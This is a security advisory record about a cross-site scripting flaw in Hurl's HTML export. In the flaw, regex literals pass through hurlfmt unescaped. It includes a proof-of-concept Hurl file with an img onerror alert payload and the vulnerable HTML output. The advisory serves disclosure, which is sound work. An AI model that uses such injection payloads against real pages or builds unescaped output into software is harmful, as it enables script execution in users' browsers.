advisory_id: GHSA-v33j-v3x4-42qg
datasource_id: github_osv_importer_v2/GHSA-v33j-v3x4-42qg
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-v33j-v3x4-42qg/GHSA-v33j-v3x4-42qg.json
aliases: []
summary: |
  Regex literal in Hurl files are not escaped when exported to HTML, allowing injections
  Given this Hurl file:

  regex.hurl:

  ```
  GET https://foo.com
  HTTP 200
  [Asserts]
  jsonpath "$.body" matches /<img src="" onerror="alert('Hi!')">/
  ```

  When exported to HTML:

  ```
  $ hurlfmt --out html regex.hurl
  <pre><code class="language-hurl"><span class="hurl-entry"><span class="request"><span class="line"><span class="method">GET</span> <span class="url">https://foo.com</span></span>
  </span><span class="response"><span class="line"><span class="version">HTTP</span> <span class="number">200</span></span>
  <span class="line"><span class="section-header">[Asserts]</span></span>
  <span class="line"><span class="query-type">jsonpath</span> <span class="string">"$.body"</span> <span class="predicate-type">matches</span> <span class="regex">/<img src="" onerror="alert('Hi!')">/</span></span>
  </span></span><span class="line"></span>
  </code></pre>
  ```

  The regex literal `/<img src="" onerror="alert('Hi!')">/` is not escaped:

  `<span class="regex">/<img src="" onerror="alert('Hi!')">/</span></span>`

  When opened in a browser, the code is run without user interaction:

  ![regex](https://github.com/user-attachments/assets/9c20a2ff-900f-4420-b38b-1e7648749119)
impacted_packages: []
severities:
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses: []
references:
  - url: https://github.com/Orange-OpenSource/hurl
    reference_type:
    reference_id:
  - url: https://github.com/Orange-OpenSource/hurl/commit/248ac41cfa1797c52241c6ef756490d90027cdf2
    reference_type:
    reference_id:
  - url: https://github.com/Orange-OpenSource/hurl/commit/7dcdbd1796785392b1e829d1f07c6687b9a8f27d
    reference_type:
    reference_id:
  - url: https://github.com/Orange-OpenSource/hurl/security/advisories/GHSA-v33j-v3x4-42qg
    reference_type:
    reference_id:
